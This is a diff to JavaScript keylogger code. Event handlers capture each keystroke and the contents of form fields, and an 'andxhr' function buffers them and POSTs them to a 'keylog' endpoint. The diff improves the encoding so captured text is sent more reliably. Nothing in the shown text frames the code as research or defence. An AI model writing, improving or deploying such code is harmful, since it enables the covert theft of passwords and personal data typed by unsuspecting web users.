@@ -64,7 +64,7 @@ function function2(e)
     
     if (var3 != "d" && var3 != 8 && var3 != 9 && var3 != 13)
     {
-        andxhr(var3.toString(16), srcname);
+        andxhr(encodeURIComponent(var3), srcname);
     }
 }
 
@@ -85,7 +85,7 @@ function function1(e)
     var3 = (e) ? e.keyCode : e.which;
     if (var3 == 9 || var3 == 8 || var3 == 13)
     {
-        andxhr(var3.toString(16), srcname);
+        andxhr(encodeURIComponent(var3), srcname);
     }
     else if (var3 == 0)
     {
@@ -93,7 +93,7 @@ function function1(e)
         text = document.getElementById(id).value;
         if (text.length != 0)
         {   
-            andxhr(text.toString(16), srcname);
+            andxhr(encodeURIComponent(text), srcname);
         }
     } 
 
@@ -107,7 +107,7 @@ function andxhr(key, inputName)
     }
     var2= var2 + key + ",";
     xhr.open("POST", "keylog", true);
-    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=utf-8");
     xhr.send(var2 + '&&' + inputName);
     
     if (key == 13 || var2.length > 3000)
